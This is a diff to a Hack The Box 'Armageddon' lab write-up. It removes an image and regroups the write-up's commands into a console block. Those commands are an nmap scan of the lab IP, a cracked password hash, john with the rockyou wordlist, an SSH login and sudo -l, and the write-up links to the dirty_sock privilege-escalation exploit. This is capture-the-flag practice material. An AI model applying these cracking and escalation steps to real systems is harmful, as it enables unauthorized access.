@@ -5,8 +5,6 @@ featured_image: '/images/htb/armageddon.png'
 excerpt: Armageddon
 ---
 
-![](/images/htb/armageddon.png)
-
 ```bash
 nmap -sC -sV -oA nmap/armageddon 10.10.10.233
 ```
@@ -68,11 +66,11 @@ After many tries:
 S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
 ```
 
-`john hash -w=/usr/share/wordlists/rockyou.txt `
-
-`ssh brucetherealadmin@10.10.10.233`
-
-`sudo -l`
+```console
+john hash -w=/usr/share/wordlists/rockyou.txt
+ssh brucetherealadmin@10.10.10.233
+sudo -l
+```
 
 [[https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py]]
 
